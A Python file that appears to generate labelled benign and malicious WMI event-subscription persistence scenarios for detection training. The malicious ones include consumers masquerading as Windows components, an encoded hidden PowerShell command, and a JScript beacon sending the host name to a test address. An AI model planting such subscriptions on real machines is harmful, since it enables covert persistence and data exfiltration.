"""Labelled scenario catalogue for T1546.003.

All payloads are inert strings: they only describe a marker file write or a
request to a TEST-NET-2 address (198.51.100.0/24, RFC 5737). Nothing in this
file is executed by the project; the simulator only serialises the data that a
WMI repository / event log would contain.
"""

from __future__ import annotations

import base64
from typing import Any

HOST = {
    "hostname": "NT230-LAB",
    "os": "Windows 10 22H2 (19045)",
    "vm": True,
}

SID_SYSTEM = "S-1-5-18"
SID_ADMINS = "S-1-5-32-544"
SID_STUDENT = "S-1-5-21-1004336348-1177238915-682003330-1001"
USER_STUDENT = "NT230LAB\\student"
USER_SYSTEM = "NT AUTHORITY\\SYSTEM"

MARKER = r"%PUBLIC%\nt230_d12_marker.txt"
MARKER_ABS = r"C:\Users\Public\nt230_d12_marker.txt"

# base64 of: Write-Output 'NT230-D12-MARKER' | Out-File -FilePath "$env:PUBLIC\nt230_d12_marker.txt"
ENCODED_PAYLOAD = (
    "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAE4AVAAyADMAMAAtAEQAMQAyAC0ATQBBAFIASwBFAFIA"
    "IgAgAHwAIABPAHUAdAAtAEYAaQBsAGUAIAAtAEYAaQBsAGUAUABhAHQAaAAgACIAJABlAG4AdgA6AFAA"
    "VQBCAEwASQBDAFwAbgB0ADIAMwAwAF8AZAAxADIAXwBtAGEAcgBrAGUAcgAuAHQAeAB0ACIA"
)


def sid_to_bytes(sid: str) -> list[int]:
    revision, authority, *subs = sid.split("-")[1:]
    values = [int(revision), len(subs)]
    values.extend(int(authority).to_bytes(6, "big"))
    for sub in subs:
        values.extend(int(sub).to_bytes(4, "little"))
    return values


def cim_escape(value: str) -> str:
    return value.replace("\\", "\\\\").replace('"', '\\"')


def _sid_literal(sid: str) -> str:
    return "{" + ", ".join(str(item) for item in sid_to_bytes(sid)) + "}"


def event_5861(
    filter_name: str,
    consumer_class: str,
    consumer_name: str,
    event_namespace: str,
    query: str,
    consumer_props: dict[str, str],
    creator_sid: str,
    user: str,
    binding_namespace: str = "root\\subscription",
) -> dict[str, Any]:
    """Render a 5861 message in the real Windows format."""
    lines = [
        "Namespace = //./" + binding_namespace.replace("\\", "/") + "; "
        f"Eventfilter = {filter_name} (refer to its activate eventid:5859); "
        f'Consumer = {consumer_class}="{consumer_name}"; PossibleCause = Binding EventFilter: ',
        "instance of __EventFilter",
        "{",
        f"\tCreatorSID = {_sid_literal(creator_sid)};",
        f'\tEventNamespace = "{cim_escape(event_namespace)}";',
        f'\tName = "{cim_escape(filter_name)}";',
        f'\tQuery = "{cim_escape(query)}";',
        '\tQueryLanguage = "WQL";',
        "};",
        "Perm. Consumer: ",
        f"instance of {consumer_class}",
        "{",
        f"\tCreatorSID = {_sid_literal(creator_sid)};",
        f'\tName = "{cim_escape(consumer_name)}";',
    ]
    for key, value in consumer_props.items():
        if key in {"Name", "CreatorSID"}:
            continue
        lines.append(f'\t{key} = "{cim_escape(str(value))}";')
    lines.append("};")
    message = "\n".join(lines)
    return {
        "EventId": 5861,
        "Channel": "Microsoft-Windows-WMI-Activity/Operational",
        "Provider": "Microsoft-Windows-WMI-Activity",
        "TimeCreated": "2026-11-17T09:00:00.0000000Z",
        "User": user,
        "Computer": HOST["hostname"],
        "RecordId": 1001,
        "Message": message,
    }


def _filter(
    name: str,
    query: str,
    event_namespace: str = "root\\cimv2",
    namespace: str = "root\\subscription",
    creator_sid: str = SID_SYSTEM,
    creator_user: str = USER_SYSTEM,
) -> dict[str, Any]:
    return {
        "name": name,
        "namespace": namespace,
        "event_namespace": event_namespace,
        "query": query,
        "query_language": "WQL",
        "creator_sid": creator_sid,
        "creator_user": creator_user,
    }


def _consumer(
    name: str,
    klass: str,
    properties: dict[str, str],
    namespace: str = "root\\subscription",
    creator_sid: str = SID_SYSTEM,
    creator_user: str = USER_SYSTEM,
) -> dict[str, Any]:
    return {
        "name": name,
        "namespace": namespace,
        "class": klass,
        "properties": properties,
        "creator_sid": creator_sid,
        "creator_user": creator_user,
    }


def _binding(
    filter_name: str,
    consumer_name: str,
    namespace: str = "root\\subscription",
    consumer_namespace: str | None = None,
) -> dict[str, Any]:
    return {
        "filter_name": filter_name,
        "filter_namespace": namespace,
        "consumer_name": consumer_name,
        "consumer_namespace": consumer_namespace or namespace,
        "creator_sid": SID_SYSTEM,
    }


def _repo(
    filters: list[dict[str, Any]],
    consumers: list[dict[str, Any]],
    bindings: list[dict[str, Any]],
    collected_at: str = "2026-11-17T09:05:00Z",
) -> dict[str, Any]:
    return {
        "schema_version": "1.0",
        "collected_at": collected_at,
        "host": HOST,
        "scope": ["root\\subscription", "root\\NT230Lab"],
        "filters": filters,
        "consumers": consumers,
        "bindings": bindings,
    }


def build_scenarios() -> list[dict[str, Any]]:
    scenarios: list[dict[str, Any]] = []

    # ------------------------------------------------------------------ B1
    scm_filter = _filter(
        "SCM Event Log Filter",
        "select * from MSFT_SCMEventLogEvent",
        creator_sid=SID_ADMINS,
        creator_user="BUILTIN\\Administrators",
    )
    scm_consumer = _consumer(
        "SCM Event Log Consumer",
        "NTEventLogEventConsumer",
        {
            "Category": "0",
            "EventType": "1",
            "NameOfUserSIDProperty": "sid",
            "SourceName": "Service Control Manager",
        },
        creator_sid=SID_ADMINS,
        creator_user="BUILTIN\\Administrators",
    )
    scenarios.append(
        {
            "scenario_id": "B1_builtin_scm",
            "label": 0,
            "category": "benign",
            "variant": "B1",
            "description": "Windows built-in SCM Event Log Filter/Consumer (real baseline, exported from the lab host).",
            "repository": _repo(
                [scm_filter], [scm_consumer], [_binding(scm_filter["name"], scm_consumer["name"])]
            ),
            "events": [
                event_5861(
                    scm_filter["name"],
                    scm_consumer["class"],
                    scm_consumer["name"],
                    scm_filter["event_namespace"],
                    scm_filter["query"],
                    scm_consumer["properties"],
                    SID_ADMINS,
                    "BUILTIN\\Administrators",
                )
            ],
            "processes": [],
            "tags": ["baseline", "allowlist"],
        }
    )

    # ------------------------------------------------------------------ B2
    it_filter = _filter(
        "IT Health Log Filter",
        "SELECT * FROM __InstanceModificationEvent WITHIN 300 "
        "WHERE TargetInstance ISA 'Win32_Service'",
    )
    it_consumer = _consumer(
        "IT Health Log Writer",
        "LogFileEventConsumer",
        {
            "LogFilePath": r"C:\ProgramData\IT\logs\service-state.log",
            "Text": r"Service state changed: %TargetInstance.Name%",
        },
    )
    scenarios.append(
        {
            "scenario_id": "B2_it_logfile_monitor",
            "label": 0,
            "category": "benign",
            "variant": "B2",
            "description": "Approved IT monitoring: LogFileEventConsumer writes service-state changes to a log file.",
            "repository": _repo(
                [it_filter], [it_consumer], [_binding(it_filter["name"], it_consumer["name"])]
            ),
            "events": [
                event_5861(
                    it_filter["name"],
                    it_consumer["class"],
                    it_consumer["name"],
                    it_filter["event_namespace"],
                    it_filter["query"],
                    it_consumer["properties"],
                    SID_SYSTEM,
                    USER_SYSTEM,
                )
            ],
            "processes": [],
            "tags": ["hard-negative", "logfile"],
        }
    )

    # ------------------------------------------------------------------ B3
    audit_filter = _filter(
        "Service State Audit",
        "SELECT * FROM __InstanceModificationEvent WITHIN 60 "
        "WHERE TargetInstance ISA 'Win32_Service' AND TargetInstance.State = 'stopped'",
    )
    audit_consumer = _consumer(
        "Service State EventLog Writer",
        "NTEventLogEventConsumer",
        {"SourceName": "NT230 Service Audit", "EventType": "1", "Category": "0"},
    )
    scenarios.append(
        {
            "scenario_id": "B3_service_state_audit",
            "label": 0,
            "category": "benign",
            "variant": "B3",
            "description": "Event-log audit of stopped services; benign use of a permanent WMI subscription.",
            "repository": _repo(
                [audit_filter],
                [audit_consumer],
                [_binding(audit_filter["name"], audit_consumer["name"])],
            ),
            "events": [
                event_5861(
                    audit_filter["name"],
                    audit_consumer["class"],
                    audit_consumer["name"],
                    audit_filter["event_namespace"],
                    audit_filter["query"],
                    audit_consumer["properties"],
                    SID_SYSTEM,
                    USER_SYSTEM,
                )
            ],
            "processes": [],
            "tags": ["hard-negative", "eventlog-consumer"],
        }
    )

    # ------------------------------------------------------------------ M1 / V1
    m1_filter = _filter(
        "Windows Update Monitor",
        "SELECT * FROM __TimerEvent WHERE TimerID = 'WindowsUpdateTimer' AND NumEvents > 0",
        creator_sid=SID_STUDENT,
        creator_user=USER_STUDENT,
    )
    m1_command = f'cmd.exe /c echo NT230-D12-MARKER > "{MARKER}"'
    m1_consumer = _consumer(
        "Windows Update Monitor Consumer",
        "CommandLineEventConsumer",
        {"CommandLineTemplate": m1_command, "ExecutablePath": ""},
        creator_sid=SID_STUDENT,
        creator_user=USER_STUDENT,
    )
    scenarios.append(
        {
            "scenario_id": "M1_cmd_marker_timer",
            "label": 1,
            "category": "malicious",
            "variant": "V1",
            "description": "V1 baseline: CommandLineEventConsumer triggered by __TimerEvent writes a marker once.",
            "repository": _repo(
                [m1_filter], [m1_consumer], [_binding(m1_filter["name"], m1_consumer["name"])]
            ),
            "events": [
                event_5861(
                    m1_filter["name"],
                    m1_consumer["class"],
                    m1_consumer["name"],
                    m1_filter["event_namespace"],
                    m1_filter["query"],
                    m1_consumer["properties"],
                    SID_STUDENT,
                    USER_STUDENT,
                )
            ],
            "processes": [
                {
                    "UtcTime": "2026-11-17T09:01:10Z",
                    "Image": r"C:\Windows\System32\cmd.exe",
                    "ParentImage": r"C:\Windows\System32\wbem\WmiPrvSE.exe",
                    "CommandLine": m1_command.replace("%PUBLIC%", r"C:\Users\Public"),
                    "User": USER_STUDENT,
                }
            ],
            "tags": ["V1", "timer", "marker"],
        }
    )

    # ------------------------------------------------------------------ M2 / V2
    m2_filter = _filter(
        "SCM Event Log Filter",
        "SELECT * FROM __InstanceCreationEvent WITHIN 5 "
        "WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'",
        creator_sid=SID_STUDENT,
        creator_user=USER_STUDENT,
    )
    m2_script = (
        'Set fso = CreateObject("Scripting.FileSystemObject")\n'
        f'Set f = fso.CreateTextFile("{MARKER_ABS}", True)\n'
        'f.WriteLine "NT230-D12-MARKER"\n'
        "f.Close\n"
    )
    m2_consumer = _consumer(
        "SCM Event Log Consumer",
        "ActiveScriptEventConsumer",
        {"ScriptingEngine": "VBScript", "ScriptText": m2_script},
        creator_sid=SID_STUDENT,
        creator_user=USER_STUDENT,
    )
    scenarios.append(
        {
            "scenario_id": "M2_activescript_masquerade",
            "label": 1,
            "category": "malicious",
            "variant": "V2",
            "description": "V2 filter + name variation: process-creation WQL (WITHIN 5) and a masqueraded ActiveScript consumer.",
            "repository": _repo(
                [m2_filter], [m2_consumer], [_binding(m2_filter["name"], m2_consumer["name"])]
            ),
            "events": [
                event_5861(
                    m2_filter["name"],
                    m2_consumer["class"],
                    m2_consumer["name"],
                    m2_filter["event_namespace"],
                    m2_filter["query"],
                    m2_consumer["properties"],
                    SID_STUDENT,
                    USER_STUDENT,
                )
            ],
            "processes": [],
            "tags": ["V2", "wql", "masquerade", "activescript"],
        }
    )

    # ------------------------------------------------------------------ M3 / V3
    m3_filter = _filter(
        "SessionSync_8f2a",
        "SELECT * FROM __InstanceCreationEvent WITHIN 2 "
        "WHERE TargetInstance ISA 'Win32_Process' "
        "AND TargetInstance.Name LIKE '%chrome.exe'",
        creator_sid=SID_STUDENT,
        creator_user=USER_STUDENT,
    )
    m3_command = (
        "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand "
        + ENCODED_PAYLOAD
    )
    m3_consumer = _consumer(
        "SessionSync_8f2a_Action",
        "CommandLineEventConsumer",
        {"CommandLineTemplate": m3_command, "ExecutablePath": ""},
        creator_sid=SID_STUDENT,
        creator_user=USER_STUDENT,
    )
    scenarios.append(
        {
            "scenario_id": "M3_encoded_powershell",
            "label": 1,
            "category": "malicious",
            "variant": "V3",
            "description": "V3 consumer variation: encoded PowerShell action with 2-second polling on chrome.exe.",
            "repository": _repo(
                [m3_filter], [m3_consumer], [_binding(m3_filter["name"], m3_consumer["name"])]
            ),
            "events": [
                event_5861(
                    m3_filter["name"],
                    m3_consumer["class"],
                    m3_consumer["name"],
                    m3_filter["event_namespace"],
                    m3_filter["query"],
                    m3_consumer["properties"],
                    SID_STUDENT,
                    USER_STUDENT,
                )
            ],
            "processes": [
                {
                    "UtcTime": "2026-11-17T09:02:20Z",
                    "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "ParentImage": r"C:\Windows\System32\wbem\WmiPrvSE.exe",
                    "CommandLine": m3_command,
                    "User": USER_STUDENT,
                }
            ],
            "tags": ["V3", "encoded", "obfuscation"],
        }
    )

    # ------------------------------------------------------------------ M4 / V4
    m4_filter = _filter(
        "Windows Defender Cache",
        "SELECT * FROM __TimerEvent WHERE TimerID = 'DefenderCacheTimer' AND NumEvents > 0",
        namespace="root\\NT230Lab",
        creator_sid=SID_SYSTEM,
        creator_user=USER_SYSTEM,
    )
    m4_command = (
        f'cmd.exe /c copy /y "%APPDATA%\\cache.dat" "{MARKER}"'
    )
    m4_consumer = _consumer(
        "DefenderCacheConsumer",
        "CommandLineEventConsumer",
        {"CommandLineTemplate": m4_command, "ExecutablePath": ""},
        namespace="root\\NT230Lab",
        creator_sid=SID_SYSTEM,
        creator_user=USER_SYSTEM,
    )
    scenarios.append(
        {
            "scenario_id": "M4_delayed_custom_namespace",
            "label": 1,
            "category": "malicious",
            "variant": "V4",
            "description": "V4 namespace + trigger-delay variation: subscription in root\\NT230Lab, 300 s timer, no process telemetry.",
            "repository": _repo(
                [m4_filter],
                [m4_consumer],
                [_binding(m4_filter["name"], m4_consumer["name"], namespace="root\\NT230Lab")],
            ),
            "events": [
                event_5861(
                    m4_filter["name"],
                    m4_consumer["class"],
                    m4_consumer["name"],
                    m4_filter["event_namespace"],
                    m4_filter["query"],
                    m4_consumer["properties"],
                    SID_SYSTEM,
                    USER_SYSTEM,
                    binding_namespace="root\\NT230Lab",
                )
            ],
            "processes": [],
            "tags": ["V4", "custom-namespace", "delayed", "static-only"],
        }
    )

    # ------------------------------------------------------------------ M5 / V5
    m5_filter = _filter(
        "Windows Telemetry Collector",
        "SELECT * FROM __InstanceCreationEvent WITHIN 30 "
        "WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'",
        creator_sid=SID_STUDENT,
        creator_user=USER_STUDENT,
    )
    m5_script = (
        'var sh = new ActiveXObject("WScript.Shell");\n'
        'var http = new ActiveXObject("MSXML2.XMLHTTP");\n'
        'var h = sh.ExpandEnvironmentStrings("%COMPUTERNAME%");\n'
        'http.open("GET", "http://198.51.100.23/collect?h=" + h, false);\n'
        "http.send();\n"
    )
    m5_consumer = _consumer(
        "Windows Telemetry Consumer",
        "ActiveScriptEventConsumer",
        {"ScriptingEngine": "JScript", "ScriptText": m5_script},
        creator_sid=SID_STUDENT,
        creator_user=USER_STUDENT,
    )
    scenarios.append(
        {
            "scenario_id": "M5_network_activescript",
            "label": 1,
            "category": "malicious",
            "variant": "V5",
            "description": "V5 consumer variation: JScript consumer with a network retrieval primitive (inert TEST-NET-2 URL).",
            "repository": _repo(
                [m5_filter], [m5_consumer], [_binding(m5_filter["name"], m5_consumer["name"])]
            ),
            "events": [
                event_5861(
                    m5_filter["name"],
                    m5_consumer["class"],
                    m5_consumer["name"],
                    m5_filter["event_namespace"],
                    m5_filter["query"],
                    m5_consumer["properties"],
                    SID_STUDENT,
                    USER_STUDENT,
                )
            ],
            "processes": [],
            "tags": ["V5", "network", "activescript"],
        }
    )

    # ------------------------------------------------------------------ M6 / V6
    m6_filter = _filter(
        "Inventory Sync",
        "SELECT * FROM __TimerEvent WHERE TimerID = 'InventorySyncTimer' AND NumEvents > 0",
        creator_sid=SID_SYSTEM,
        creator_user=USER_SYSTEM,
    )
    m6_command = r'cmd.exe /c echo NT230-D12-MARKER > "C:\Windows\Temp\nt230_d12_marker.txt"'
    m6_consumer = _consumer(
        "Inventory Sync Action",
        "CommandLineEventConsumer",
        {"CommandLineTemplate": m6_command},
        creator_sid=SID_SYSTEM,
        creator_user=USER_SYSTEM,
    )
    scenarios.append(
        {
            "scenario_id": "M6_stealth_low_noise",
            "label": 1,
            "category": "malicious",
            "variant": "V6",
            "description": "V6 low-noise evasion: SYSTEM principal, neutral names, Windows\\Temp target and no WmiPrvSE child telemetry.",
            "repository": _repo(
                [m6_filter], [m6_consumer], [_binding(m6_filter["name"], m6_consumer["name"])]
            ),
            "events": [
                event_5861(
                    m6_filter["name"],
                    m6_consumer["class"],
                    m6_consumer["name"],
                    m6_filter["event_namespace"],
                    m6_filter["query"],
                    m6_consumer["properties"],
                    SID_SYSTEM,
                    USER_SYSTEM,
                )
            ],
            "processes": [],
            "tags": ["V6", "evasion", "low-noise", "telemetry-gap"],
        }
    )

    return scenarios


def encoded_payload_readable() -> str:
    return base64.b64decode(ENCODED_PAYLOAD).decode("utf-16-le")
